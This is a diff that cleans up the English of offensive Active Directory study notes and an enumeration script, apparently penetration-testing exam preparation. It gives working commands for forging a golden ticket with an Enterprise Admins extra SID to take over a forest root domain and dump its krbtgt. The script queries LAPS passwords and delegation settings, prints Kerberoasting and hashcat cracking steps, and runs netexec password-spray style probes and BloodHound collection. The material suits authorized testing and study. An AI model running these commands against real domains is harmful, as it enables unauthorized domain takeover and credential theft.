+**Situation**: You already control high privileges in a child domain (`child.corp.local`) — including the child krbtgt or a child DA you can dump — and the final target asset sits at the forest root (`corp.local`). **Do not assume this always works**: first determine the trust type/direction and whether SID filtering is in effect.
 
-**Assumptions**: Need to master - ① Trust type: Intra-forest father-son trust (`TrustAttributes: WITHIN_FOREST`, SID filtering is not effective by default → Extra SID attack is possible); or external/inter-forest trust (SID filtering is enabled by default → Extra SID is invalid); ② Direction: two-way / one-way (it can be authenticated); ③ Sub-domain krbtgt hash (required for Extra SID golden ticket) or sub-domain trust key.
+**Assumptions**: You need ① the trust type — an intra-forest parent/child trust (`TrustAttributes: WITHIN_FOREST`, SID filtering off by default -> the Extra SID attack works), or an external/inter-forest trust (SID filtering on by default -> Extra SID is useless); ② the direction — two-way/one-way (you only need to be able to authenticate across); ③ the child krbtgt hash (required for the Extra SID golden ticket) or the child trust key.
 
-**Prepare (attacker)**: `nltest`/PowerShell enumeration trust (script `m12-ad-enum-linux.sh -Mode Trust`); `impacket-ticketer` (do Extra SID golden ticket); confirm root domain SID (`Get-DomainSID`/ldapsearch).
+**Prepare (attacker side)**: enumerate trusts with `nltest`/PowerShell (script `m12-ad-enum-linux.sh -Mode Trust`); `impacket-ticketer` (to build the Extra SID golden ticket); confirm the root domain SID (`Get-DomainSID`/ldapsearch).
 
-**Procedure**：
+**Procedure**:
 ```bash
-# ① Determination: Check the trust attributes and SIDs of both parties on the subdomain
+# ① Decide: on the child domain, check the trust attributes and both SIDs
 nltest /domain_trusts /all_trusts
-ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHIN_FOREST, 2=Two-way
-# ② Use the subdomain krbtgt as a golden ticket and insert it into the root domain Enterprise Admins SID
+ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHIN_FOREST, 2=two-way
+# ② Build a golden ticket with the child krbtgt and stuff in the root domain Enterprise Admins SID
 impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
   -domain-sid <child domain SID> \
   -extra-sid 'S-1-5-21-<ROOT-DOMAIN-SID>-519' Administrator
 export KRB5CCNAME=Administrator.ccache
-# ③ Authentication to root domain assets (cifs or LDAP of root DC)
+# ③ Authenticate to root domain assets (cifs or LDAP on the root DC)
 impacket-secretsdump -k -no-pass ROOTDC.corp.local
 ```
-**Scripts used**: `m12-ad-enum-linux.sh` (Trust/Domain SID enumeration output); `m12-laps-and-trust-notes.md` (Decision table + Extra SID condition quick check).
+**Scripts used**: `m12-ad-enum-linux.sh` (trust/domain SID enumeration output); `m12-laps-and-trust-notes.md` (decision table + quick reference for the Extra SID conditions).
 
-**Validation**: `secretsdump -k` can dump the root domain `krbtgt` to the root DC, which proves that the Extra SID is effective (the root domain identity is obtained). If only the subdomain content is obtained/rejected, it means that the filtering is effective or the direction does not match, and the failure branch is taken.
+**Validation**: if `secretsdump -k` can dump the root domain `krbtgt` from the root DC, the Extra SID worked (you have a root domain identity). If you only get child domain content or are refused, filtering is in effect or the direction is wrong — take the failure branches.
 
-**Failure branches and alternatives**：
-- trust is external/forest（SID Filter on）→ Extra SID Invalid, don’t waste it: use cross-domain instead ACL（subdomain DA Often granted certain resource permissions to the root domain, first enumerate the root domain's rights to subdomain subjects. ACL）Or find other entrances reachable in the root domain（LAPS/delegate/Certificate re-evaluation）。
-- One-way trust direction is"root→child"（Subdomain cannot be authenticated to root）→ Extra SID Neither the mutual trust ticket nor the mutual trust ticket can be used, so we can only rely on other paths within the root zone.。
-- no subdomain krbtgt But already controlled subdomain DA → first in subdomain DC `secretsdump` take krbtgt Make another golden ticket; you can’t get it krbtgt（Only control the wrong DC High authority）→ Move other horizontal directions within the sub-domain to DC。
-- The golden ticket subject failed to authenticate in the root zone.（TGS rejected）→ examine `/etc/hosts` Reagan DC FQDN、`-extra-sid` root domain SID Whether it is written correctly (less 519 suffix or root domain SID Copying errors are high-frequency errors）。
+**Failure branches and alternatives**:
+- The trust is external/inter-forest (SID filtering on) -> Extra SID is useless, do not burn time: switch to cross-domain ACLs (a child DA is often granted rights on some root domain resources — enumerate the root domain ACLs for child domain principals first) or look for other reachable entry points in the root domain (re-assess LAPS/delegation/certificates).
+- The one-way trust points "root -> child" (the child cannot authenticate to the root) -> neither Extra SID nor inter-realm referral tickets work; you can only use other paths inside the root domain.
+- No child krbtgt but you do control the child DA -> `secretsdump` the child DC first to get krbtgt, then build the golden ticket; if you cannot get krbtgt (you only control non-DC high privileges) -> move laterally inside the child domain until you reach a DC.
+- The golden ticket principal fails to authenticate in the root domain (TGS refused) -> check the root DC FQDN in `/etc/hosts` and whether the root domain SID in `-extra-sid` is correct (a missing `-519` suffix or a mistyped root domain SID are the most frequent mistakes).
 
-**Exam / OPSEC notes**: The golden ticket belongs to the "most sensitive operation in the domain" and is only executed after confirming the trust determination (WITHIN_FOREST + direction is feasible); the ticketer only runs locally on the attack machine and does not deliver any files to the target; clean up the ccache after completion.
+**Exam / OPSEC notes**: A golden ticket is a "highest sensitivity in the domain" operation — only run it after the trust assessment confirms it (WITHIN_FOREST + a workable direction); ticketer runs locally on the attacker box and delivers no files to the target; clean up the ccache afterwards.
 
 ---
 
@@ -1673,82 +1673,92 @@ impacket-secretsdump -k -no-pass ROOTDC.corp.local
 ````bash
 #!/usr/bin/env bash
 # =============================================================================
-# Purpose: A collection of command templates for enumerating AD/LDAP from the Linux (Kali) side - ldapsearch basics/user/
-#       computers/groups/spn/delegation/LAPS/trust/SID, plus nmap ldap script, netexec, bloodhound-
-#       python three auxiliary lines. Each mode prints the command to be executed before (by default) actually executing it.
-# Scenario: M12 Scenario 49 (read LAPS), 51 (RBCD prefix: find writable computer objects), 52 (find delegation and SPN),
-#       53 (trust decision + domain SID). Used with m12-laps-and-trust-notes.md.
+# Purpose: a collection of command templates for enumerating AD/LDAP from the
+#       Linux (Kali) side -- ldapsearch basics/users/computers/groups/SPN/
+#       delegation/LAPS/trust/SID, plus three auxiliary routes: nmap ldap
+#       scripts, netexec and bloodhound-python. Every mode prints the command it
+#       is about to run first, then (by default) actually runs it.
+# Scenarios: M12 scenario 49 (read LAPS), 51 (RBCD prerequisite: find writable
+#       computer objects), 52 (find delegation and SPNs), 53 (trust assessment +
+#       domain SID). Use together with m12-laps-and-trust-notes.md.
 # Dependencies: ldap-utils (ldapsearch, Kali: sudo apt install -y ldap-utils);
-#       nmap (base/nmap mode); netexec (netexec mode); bloodhound-python (bloodhound
-#       mode); impacket-lookupsid / python3 (sid mode, choose one of the two);
-#       The script does not exit silently when the tool is missing, prints a readable error and degrades to "print command only".
-# Use: ./m12-ad-enum-linux.sh -m all -s DC01.corp.local -D corp.local \
+#       nmap (base/nmap modes); netexec (netexec mode); bloodhound-python
+#       (bloodhound mode); impacket-lookupsid / python3 (sid mode, either one);
+#       when a tool is missing the script does not exit silently -- it prints a
+#       readable error and degrades to "print the command only".
+# Usage: ./m12-ad-enum-linux.sh -m all -s DC01.corp.local -D corp.local \
 #            -u USER -p 'PASS'
 #       ./m12-ad-enum-linux.sh -m laps  -s DC01.corp.local -D corp.local -u USER -p 'PASS'
 #       ./m12-ad-enum-linux.sh -m trust -s DC01.corp.local -D corp.local -u USER -p 'PASS'
-#       ./m12-ad-enum-linux.sh -m base -s DC01.corp.local -n # Only print commands but do not execute them
-# Placeholder (variables must be used in scripts, replaced before running, do not write real domain name/IP/password):
-#   TARGET = DC/target host IP or FQDN (-s passed in, for example DC01.corp.local)
-#   DOMAIN = AD domain name FQDN (-D is passed in, for example corp.local; NetBIOS section uses -N, for example CORP)
-#   USER/PASS/NTHASH = bind credentials (-u/-p/-H); NTHASH only with netexec
-#       Bloodhound mode is available (LDAP simple binding requires clear text, NTHASH mode will automatically prompt and downgrade)
-# Test status: Not tested in a real domain environment; local bash -n passed, the logic is "print + execution + downgrade prompt"
+#       ./m12-ad-enum-linux.sh -m base  -s DC01.corp.local -n      # print commands only, do not run
+# Placeholders (always held in variables inside the script; substitute before
+# running and never write real domain names/IPs/passwords):
+#   TARGET = DC/target host IP or FQDN (passed via -s, e.g. DC01.corp.local)
+#   DOMAIN = AD domain FQDN (passed via -D, e.g. corp.local; NetBIOS part via -N, e.g. CORP)
+#   USER / PASS / NTHASH = bind credentials (-u / -p / -H); NTHASH works only in
+#       netexec and bloodhound modes (an LDAP simple bind needs cleartext; NTHASH
+#       mode warns about this automatically and degrades)
+# Test status: not tested in a real domain environment; bash -n passes locally,
+#       the logic is "print + execute + degrade hint"
 # Differences from docs/12-ad-attacks.md:
-#   1) The document is written as `-Mode Trust` (PowerShell style), but Bash actually uses `-m trust`, which has the same meaning.
-#   2) The nltest in the document 53 scenario is a Windows command. The trust mode of this script uses ldapsearch.
-#      (objectClass=trustedDomain) equivalent implementation; the original text of nltest is retained in m12-laps-and-
-#      trust-notes.md, will not be executed in this script.
-#   3) The document does not require the five modes of base/nmap/netexec/bloodhound/sid. They are completed here to facilitate one
-#      The command ran through the cold start enumeration of "unknown domain".
+#   1) The doc writes `-Mode Trust` (PowerShell style); Bash actually uses
+#      `-m trust` -- same meaning.
+#   2) The nltest in the doc's scenario 53 is a Windows command; this script's
+#      trust mode implements the equivalent with ldapsearch
+#      (objectClass=trustedDomain); the original nltest text is kept in
+#      m12-laps-and-trust-notes.md and is not executed inside this script.
+#   3) The doc does not ask for the base/nmap/netexec/bloodhound/sid modes; they
+#      are added here so one command can cover cold-start enumeration of an
+#      "unknown domain".
 # =============================================================================
 set -u
 
 MODE="all"
-DC=""            # -s  TARGET：DC Host（IP or FQDN）
-DOMAIN=""        # -D  DOMAIN：domain FQDN
-NETBIOS=""       # -N  NetBIOS Name (for binding, leave blank to start from DOMAIN Derivation：corp.local -> CORP）
+DC=""            # -s  TARGET: DC host (IP or FQDN)
+DOMAIN=""        # -D  DOMAIN: domain FQDN
+NETBIOS=""       # -N  NetBIOS name (for binding; empty derives it from DOMAIN: corp.local -> CORP)
 USER=""          # -u
 PASS=""          # -p
 NTHASH=""        # -H
-BASEDN=""        # -b  Override default BaseDN
+BASEDN=""        # -b  override the default BaseDN
 OUTDIR="$HOME/osep/loot/m12"
-DRY=0            # -n  Only prints the command, does not execute it
+DRY=0            # -n  print commands only, do not run
 PYBIN="$(command -v python3 || true)"
 
 usage() {
     sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
     cat <<'EOF'
 
-parameter：
-  -m <mode>   enumeration mode (default all）：
-              all         Run in turn base/users/computers/groups/spn/delegation/laps/trust
-              base        RootDSE naming context + nmap ldap script + Anonymous readability detection
-              users       domain user（sAMAccountName/UPN/description/pwdLastSet）
-              computers   domain computer（dnsHostName/operatingSystem/last login）
-              groups      domain group + privileged group member（DA/EA/Schema Admins/Builtin Admins）
-              spn         servicePrincipalName=*（Kerberoast candidate）
-              delegation  Unconstrained(UAC 524288)/constraint(msDS-AllowedToDelegateTo)/
-                          RBCD(msDS-AllowedToActOnBehalfOfOtherIdentity) Search all three categories at once
-              laps        LAPS Four attribute detection（legacy ms-Mcs-AdmPwd* + Windows LAPS
-                          msLAPS-Password* / msLAPS-EncryptedPassword）
-              trust       trustedDomain：trustPartner/trustAttributes/trustDirection
-                          + Decision table（WITHIN_FOREST=0x20 / Two-way=3）
-              sid         domain SID（impacket-lookupsid priority, otherwise python3 untie objectSid）
+Parameters:
+  -m <mode>   enumeration mode (default all):
+              all         run base/users/computers/groups/spn/delegation/laps/trust in order
+              base        RootDSE naming contexts + nmap ldap scripts + anonymous readability probe
+              users       domain users (sAMAccountName/UPN/description/pwdLastSet)
+              computers   domain computers (dnsHostName/operatingSystem/last logon)
+              groups      domain groups + privileged group members (DA/EA/Schema Admins/Builtin Admins)
+              spn         servicePrincipalName=* (Kerberoast candidates)
+              delegation  unconstrained (UAC 524288)/constrained (msDS-AllowedToDelegateTo)/
+                          RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) all three in one pass
+              laps        LAPS four-attribute probe (legacy ms-Mcs-AdmPwd* + Windows LAPS
+                          msLAPS-Password* / msLAPS-EncryptedPassword)
+              trust       trustedDomain: trustPartner/trustAttributes/trustDirection
+                          + decision table (WITHIN_FOREST=0x20 / two-way=3)
+              sid         domain SID (impacket-lookupsid first, otherwise python3 decodes objectSid)
               nmap        nmap -n -sV --script "ldap* and not brute"
-              netexec     netexec ldap / smb / winrm Three quick password spray detection
-              bloodhound  bloodhound-python -c ALL（output zip Return to local machine BloodHound analyze）
-  -s <host>   DC / target host（TARGET），Required
-  -D <fqdn>   domain FQDN（DOMAIN），Required (for derivation BaseDN with binding DN）
-  -N <name>   NetBIOS Domain name (default from -D Capitalize the first paragraph）
-  -u <user>   Bind user（USER）；Leave blank to bind anonymously
-  -p <pass>   clear text password（PASS）；Give -u Required when
-  -H <hash>   NT hash（NTHASH），only netexec / bloodhound Mode support
-  -b <dn>     Manually specified BaseDN（default DC=corp,DC=local The form consists of -D Derivation）
-  -o <dir>    Product directory (default ~/osep/loot/m12）
-  -n          Only print command is not executed（dry run，write report/Used when taking exam notes）
-  -h          This help
+              netexec     three quick password-spray style probes: netexec ldap / smb / winrm
+              bloodhound  bloodhound-python -c ALL (produces a zip to analyze in BloodHound locally)
+  -s <host>   DC / target host (TARGET), required
+  -D <fqdn>   domain FQDN (DOMAIN), required (used to derive BaseDN and bind DN)
+  -N <name>   NetBIOS domain name (defaults to the first label of -D, uppercased)
+  -u <user>   bind user (USER); empty means anonymous bind
+  -p <pass>   cleartext password (PASS); required when -u is given
+  -H <hash>   NT hash (NTHASH), only netexec / bloodhound modes support it
+  -b <dn>     set BaseDN by hand (default derived from -D in the form DC=corp,DC=local)
+  -o <dir>    output directory (default ~/osep/loot/m12)
+  -n          print commands only, do not run (dry run; useful when writing reports/exam notes)
+  -h          this help
 
-exit code：0 normal / 1 Parameter error / 2 Dependencies are missing and cannot be downgraded
+Exit codes: 0 normal / 1 bad arguments / 2 dependency missing with no fallback
 EOF
     exit 0
 }
@@ -1776,18 +1786,18 @@ while getopts "m:s:D:N:u:p:H:b:o:nh" opt; do
     esac
 done
 
-# ---------- Parameter verification ----------
+# ---------- argument validation ----------
 if [ -z "$DC" ] || [ -z "$DOMAIN" ]; then
-    err "Missing required parameters: -s <DC host> and -D <domain FQDN> must be provided (example: -s DC01.corp.local -D corp.local)"
+    err "missing required arguments: -s <DC host> and -D <domain FQDN> must be provided (e.g. -s DC01.corp.local -D corp.local)"
     usage
 fi
 if [ -n "$USER" ] && [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
-    err "If -u $USER is given, you must give -p PASS or -H NTHASH"
+    err "-u $USER requires either -p PASS or -H NTHASH"
     usage
 fi
 case "$MODE" in
     all|base|users|computers|groups|spn|delegation|laps|trust|sid|nmap|netexec|bloodhound) ;;
-    *) err "Unknown -m mode: ${MODE} (see listing with -h)"; exit 1;;
+    *) err "unknown -m mode: ${MODE} (use -h for the list)"; exit 1 ;;
 esac
 
 # BaseDN derivation: corp.local -> DC=corp,DC=local
@@ -1807,15 +1817,15 @@ fi
 BIND_DN="$NETBIOS\\$USER"
 LDAP_URI="ldap://$DC"
 
-mkdir -p "$OUTDIR" 2>/dev/null || err "Unable to create product directory ${OUTDIR} (does not affect print-only mode)"
+mkdir -p "$OUTDIR" 2>/dev/null || err "cannot create the output directory ${OUTDIR} (does not affect print-only mode)"
 
-info "Target DC: $DC"
-info "Domain: $DOMAIN (BaseDN=$BASEDN, NetBIOS=$NETBIOS)"
-if [ -n "$USER" ]; then info "Bind identity: $BIND_DN"; else info "Bind identity: anonymous (-x, most domains will reject it, only for detection)"; fi
-[ "$DRY" = "1" ] && info "DRY RUN: only print commands"
+info "target DC : $DC"
+info "domain    : $DOMAIN (BaseDN=$BASEDN, NetBIOS=$NETBIOS)"
+if [ -n "$USER" ]; then info "bind identity: $BIND_DN"; else info "bind identity: anonymous (-x; most domains refuse it, probe only)"; fi
+[ "$DRY" = "1" ] && info "DRY RUN: print commands only"
 
-# ---------- Universal actuator ----------
-# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
+# ---------- shared executor ----------
+# Print a command line: only quote arguments containing spaces/quotes, so the output can be copy-pasted as is
 printable() {
     local out="" a
     for a in "$@"; do
@@ -1827,17 +1837,17 @@ printable() {
     printf '%s\n' "${out# }"
 }
 
-# run_cmd <Description> <Command...>: Print first, then execute if it is not dry; give a readable error when the command does not exist
+# run_cmd <description> <command...>: print first, then execute unless dry; give a readable error if the command is missing
 run_cmd() {
     local desc="$1"; shift
     head_ "$desc"
     printable "$@"
     if [ "$DRY" = "1" ]; then return 0; fi
     if ! have "$1"; then
-        err "Missing command on this machine: $1 (Kali: sudo apt install -y ldap-utils nmap impacket-scripts, or pipx install corresponding tool)"
+        err "command missing on this host: $1 (Kali: sudo apt install -y ldap-utils nmap impacket-scripts, or pipx install the tool)"
         return 0
     fi
-    "$@" 2>&1 || err "The command returns non-zero (this will happen if LDAP rejects anonymity/credential error/network failure), please check the above output."
+    "$@" 2>&1 || err "command returned non-zero (LDAP refusing anonymous / bad credentials / no network all look like this), check the output above"
     return 0
 }
 
@@ -1853,10 +1863,10 @@ ldap_search() {
     fi
 }
 
-# ---------- Implementation of each mode ----------
+# ---------- mode implementations ----------
 mode_base() {
     ldap_search "(objectClass=*)" "namingContexts"
-    run_cmd "nmap ldap script (can be run anonymously, check the domain information and whether anonymous binding is allowed)" \
+    run_cmd "nmap ldap scripts (anonymous is enough; shows domain info and whether anonymous bind is allowed)" \
         nmap -n -sV --script "ldap* and not brute" -p 389 "$DC"
 }
 
@@ -1864,8 +1874,8 @@ mode_users() {
     ldap_search "(&(objectClass=user)(objectCategory=person))" \
         "sAMAccountName userPrincipalName description pwdLastSet lastLogon memberOf adminCount"
     echo
-    info "Just want to see the user name: ldapsearch ... '(&(objectClass=user)(objectCategory=person))' sAMAccountName | grep sAMAccountName:"
-    info "Grab AS-REP Roasting candidates (no pre-authentication required, UAC 4194304):"
+    info "usernames only: ldapsearch ... '(&(objectClass=user)(objectCategory=person))' sAMAccountName | grep sAMAccountName:"
+    info "grab AS-REP Roasting candidates (no pre-auth required, UAC 4194304):"
     printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "%s" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName\n' \
         "$LDAP_URI" "$BIND_DN" "$BASEDN"
 }
@@ -1878,19 +1888,19 @@ mode_computers() {
 mode_groups() {
     ldap_search "(objectClass=group)" "sAMAccountName member memberOf adminCount"
     echo
-    info "Members of privileged groups (according to well-known RID), use SID to check directly for more stability:"
+    info "privileged group members by well-known RID; querying by SID directly is more reliable:"
     for rid in 512 519 518 544; do
-        printf 'ldapsearch -x -H %s -D "%s" -w PASS -b "CN=Users,%s" "(objectSid=<domain SID-%s>)" sAMAccountName member\n' \
+        printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "CN=Users,%s" "(objectSid=<domainSID-%s>)" sAMAccountName member\n' \
             "$LDAP_URI" "$BIND_DN" "$BASEDN" "$rid"
     done
-    info "(For groups not found in CN=Users, use -b \ instead."$BASEDN\"Full directory search (objectSID=...))"
+    info "(for groups not found under CN=Users use -b \"$BASEDN\" to search the whole directory with (objectSID=...))"
 }
 
 mode_spn() {
     ldap_search "(&(servicePrincipalName=*)(!(objectClass=computer)))" \
         "sAMAccountName servicePrincipalName memberOf adminCount pwdLastSet"
     echo
-    info "Kerberoast (requires plaintext or NTHASH, produces hashcat -m 13100 breakable ticket):"
+    info "Kerberoast (needs cleartext or NTHASH; produces tickets crackable with hashcat -m 13100):"
     printf '  impacket-GetUserSPNs -dc-ip %s -outputfile %s/spn.txt %s/%s:PASS\n' \
         "$DC" "$OUTDIR" "$NETBIOS" "$USER"
     printf '  hashcat -m 13100 %s/spn.txt /usr/share/wordlists/rockyou.txt\n' "$OUTDIR"
@@ -1898,43 +1908,43 @@ mode_spn() {
 
 mode_delegation() {
     ldap_search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
-        "sAMAccountName dnsHostName"            # Unconstrained delegation TRUSTED_FOR_DELEGATION
+        "sAMAccountName dnsHostName"            # unconstrained delegation, TRUSTED_FOR_DELEGATION
     ldap_search "(msDS-AllowedToDelegateTo=*)" \
         "sAMAccountName msDS-AllowedToDelegateTo"   # constrained delegation
     ldap_search "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
-        "sAMAccountName dnsHostName"                 # Resource-based constrained delegation (has been written about）
+        "sAMAccountName dnsHostName"                 # resource-based constrained delegation (has been written before)
     echo
-    info "Determination description: Unconstrained = UAC contains 524288; Constrained = msDS-AllowedToDelegateTo on the account has a value;"
-    info "The target of RBCD is written on msDS-AllowedToActOnBehalfOfOtherIdentity of the "target computer"."
+    info "how to read this: unconstrained = UAC contains 524288; constrained = msDS-AllowedToDelegateTo has a value on the account;"
+    info "for RBCD the target is written on the 'target computer' in msDS-AllowedToActOnBehalfOfOtherIdentity."
 }
 
 mode_laps() {
-    info "Search both versions of LAPS at once (the output is empty when the attribute does not exist, and the deployment version is judged based on this):"
+    info "query both LAPS generations at once (a missing attribute yields empty output, which tells you which version is deployed):"
     ldap_search "(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
         "sAMAccountName dnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-PasswordExpirationTime msLAPS-EncryptedPassword"
     echo
-    info "legacy LAPS plaintext query (AdmPwd): -b \"$BASEDN\" \"(ms-Mcs-AdmPwd=*)\" dnshostname ms-Mcs-AdmPwd"
-    info "Windows LAPS plain text mode: Change the above properties to msLAPS-Password / msLAPS-PasswordExpirationTime"
-    info "If Windows LAPS only has msLAPS-EncryptedPassword (DPAPI encryption), pure LDAP cannot decipher the plaintext."
-    info "Requires target machine Get-LapsADPassword or DC side LAPS module - see m12-laps-and-trust-notes.md for details"
+    info "legacy LAPS cleartext query (AdmPwd): -b \"$BASEDN\" \"(ms-Mcs-AdmPwd=*)\" dnshostname ms-Mcs-AdmPwd"
+    info "Windows LAPS cleartext mode: swap the attributes above for msLAPS-Password / msLAPS-PasswordExpirationTime"
+    info "if Windows LAPS only shows msLAPS-EncryptedPassword (DPAPI encrypted), plain LDAP cannot recover the cleartext;"
+    info "you need Get-LapsADPassword on the target or the LAPS module on the DC -- see m12-laps-and-trust-notes.md"
 }
 
-# Trust attribute decoding table (for scene 53 determination)
+# Trust attribute decoding table (used by the scenario 53 assessment)
 print_trust_legend() {
     cat <<'EOF'
 
---- Judgment table (check the numbers above）---------------------------------------
-trustDirection: 0=Disable  1=inbound(The other party can authenticate to this domain)  2=outbound(This domain can authenticate to the other party)  3=Two-way
-trustType     : 1=Downlevel(NoAD)  2=Uplevel(AD)  3=MIT(Kerberos v5)  4=DCE
-trustAttributes key bit：
-  0x00000020 (32)  WITHIN_FOREST  -> Rinnai(father and son)trust，SID Filtering does not take effect by default，Extra SID feasible
-  0x00000008 (8)   FOREST_TRANSITIVE -> Trust in the woods
-  0x00000040 (64)  FOREST_TRANSITIVE cross-forest position
-  0x00000400 (1024) TREAT_AS_EXTERNAL / 0x00000004 QUARANTINED -> SID Filter by external processing
-Judgment conclusion：
-  WITHIN_FOREST(0x20) + Outbound or bidirectional(2/3) -> scene 53 of Extra SID Golden ticket route established
-  external/forest trust or QUARANTINED        -> SID filtering Enabled by default，Extra SID Invalid, change the path
-------------------------------------------------------------------------
+--- Decision table (map the values above onto these) ---------------------
+trustDirection: 0=disabled  1=inbound (the other side can authenticate to this domain)  2=outbound (this domain can authenticate to the other side)  3=two-way
+trustType     : 1=Downlevel(non-AD)  2=Uplevel(AD)  3=MIT(Kerberos v5)  4=DCE
+trustAttributes key bits:
+  0x00000020 (32)  WITHIN_FOREST  -> intra-forest (parent/child) trust, SID filtering off by default, Extra SID works
+  0x00000008 (8)   FOREST_TRANSITIVE -> forest trust
+  0x00000040 (64)  cross-forest bit other than FOREST_TRANSITIVE
+  0x00000400 (1024) TREAT_AS_EXTERNAL / 0x00000004 QUARANTINED -> SID filtering is treated as external
+Conclusion:
+  WITHIN_FOREST(0x20) + outbound or two-way (2/3) -> the Extra SID golden ticket route in scenario 53 holds
+  external/forest trust or QUARANTINED             -> SID filtering is on by default, Extra SID does not work, change path
+-------------------------------------------------------------------------
 EOF
 }
 
@@ -1943,12 +1953,12 @@ mode_trust() {
         "cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier"
     print_trust_legend
     echo
-    info "Equivalent on Windows side (executed on subdomain host): nltest /domain_trusts /all_trusts"
+    info "Windows-side equivalent (run on a child domain host): nltest /domain_trusts /all_trusts"
     info "netexec side: netexec ldap $DC -u $USER -p 'PASS' -M enum_trusts"
-    info "For the command to make Extra SID golden tickets after getting the subdomain krbtgt, see m12-laps-and-trust-notes.md"
+    info "for the Extra SID golden ticket once you have the child krbtgt, see m12-laps-and-trust-notes.md"
 }
 
-# objectSid(base64) -> S-1-5-21-... (decode when python3 is available, otherwise give base64 with alternative command)
+# objectSid(base64) -> S-1-5-21-... (decode when python3 is available, otherwise print the base64 and an alternative command)
 decode_sid_b64() {
     local b64="$1"
     if [ -n "$PYBIN" ]; then
@@ -1956,7 +1966,7 @@ decode_sid_b64() {
 import base64, sys, struct
 raw = base64.b64decode(sys.argv[1].strip())
 rev, sub = raw[0], raw[1]
-# Identity part big endian 6 bytes, sub-organization part 4 bytes little endian each
+# identifier authority is 6 bytes big-endian, each subauthority is 4 bytes little-endian
 ident = struct.unpack('>Q', b'\x00\x00' + raw[2:8])[0]
 out = ["S-%d-%d" % (rev, ident)]
 for i in range(sub):
@@ -1965,15 +1975,15 @@ for i in range(sub):
 print('-'.join(out))
 PYEOF
     else
-        echo "(Not available in python3, objectSid(base64)=${b64}; use impacket-lookupsid to get SID instead)"
+        echo "(python3 unavailable, objectSid(base64)=${b64}; use impacket-lookupsid to get the SID instead)"
     fi
 }
 
 mode_sid() {
     if [ -n "$USER" ] && have impacket-lookupsid; then
-        run_cmd "Domain SID (lookupsid, the most stable)" impacket-lookupsid "$NETBIOS/$USER:$PASS@$DC" 2
+        run_cmd "domain SID (lookupsid, most reliable)" impacket-lookupsid "$NETBIOS/$USER:$PASS@$DC" 2
     else
-        info "impacket-lookupsid is unavailable or has no credentials. Return to LDAP to read objectSid and then decode:"
+        info "impacket-lookupsid unavailable or no credentials, falling back to LDAP objectSid and decoding it:"
         local b64
         if [ -n "$USER" ]; then
             b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -D "$BIND_DN" -w "$PASS" \
@@ -1986,16 +1996,16 @@ mode_sid() {
         fi
         printf 'ldapsearch ... "(objectClass=domainDNS)" objectSid\n'
         if [ -n "$b64" ]; then
-            printf 'Domain SID: %s\n' "$(decode_sid_b64 "$b64")"
-            info "Scenario 53 does -extra-sid with its Enterprise Admins SID (domain SID + -519)"
+            printf 'domain SID : %s\n' "$(decode_sid_b64 "$b64")"
+            info "scenario 53 uses it for -extra-sid with the Enterprise Admins SID (domain SID + -519)"
         else
-            err "ObjectSid not retrieved: Anonymous rejected (add -u/-p) or DC is unreachable"
+            err "no objectSid returned: anonymous was refused (add -u/-p) or the DC is unreachable"
         fi
     fi
 }
 
 mode_nmap() {
-    run_cmd "Complete set of nmap LDAP scripts" nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 "$DC"
+    run_cmd "full nmap LDAP script set" nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 "$DC"
 }
 
 mode_netexec() {
@@ -2004,14 +2014,14 @@ mode_netexec() {
     elif [ -n "$USER" ]; then
         local creds="-u $USER -p $PASS"
     else
-        err "Netexec mode requires -u/-p or -u/-H (NTHASH Only netexec/bloodhound mode eats it)"
+        err "netexec mode needs -u/-p or -u/-H (NTHASH is only accepted by the netexec/bloodhound modes)"
         return 0
     fi
-    run_cmd "netexec ldap (domain information + common modules)" netexec ldap "$DC" $creds \
+    run_cmd "netexec ldap (domain info + common modules)" netexec ldap "$DC" $creds \
         -M enum_trusts -M laps
-    run_cmd "netexec smb (share/sign/session)" netexec smb "$DC" $creds --shares
-    run_cmd "netexec winrm (whether it can be executed remotely)" netexec winrm "$DC" $creds
-    info "The module name changes with the version: netexec ldap -L lists available modules, then select enum_trusts / laps / adcs"
+    run_cmd "netexec smb (shares/signing/sessions)" netexec smb "$DC" $creds --shares
+    run_cmd "netexec winrm (is remote execution possible)" netexec winrm "$DC" $creds
+    info "module names vary by version: netexec ldap -L lists the available ones, then pick enum_trusts / laps / adcs"
 }
 
 mode_bloodhound() {
@@ -2020,13 +2030,13 @@ mode_bloodhound() {
     elif [ -n "$USER" ]; then
         local creds="-u $USER -p $PASS"
     else
-        err "bloodhound mode requires -u/-p or -u/-H"
+        err "bloodhound mode needs -u/-p or -u/-H"
         return 0
     fi
-    run_cmd "bloodhound-python full collection (output zip in ${OUTDIR})" \
+    run_cmd "bloodhound-python full collection (produces a zip in ${OUTDIR})" \
         bloodhound-python -c ALL $creds -d "$DOMAIN" -dc "$DC" -ns "$DC" --dns-tcp
-    info "After collecting, copy $OUTDIR/*.zip back to the local machine and import it into BloodHound: sudo neo4j start && bloodhound"
-    info "When crossing network segments (using socks), add proxychains before the command and keep --dns-tcp"
+    info "when collection finishes, copy $OUTDIR/*.zip back to your host and import it into BloodHound: sudo neo4j start && bloodhound"
+    info "across network segments (over socks) prefix the command with proxychains and keep --dns-tcp"
 }
 
 case "$MODE" in
@@ -2048,79 +2058,87 @@ case "$MODE" in
     bloodhound) mode_bloodhound ;;
 esac
 
-printf '\n[*] Completion mode: %s (product directory %s)\n' "$MODE" "$OUTDIR"
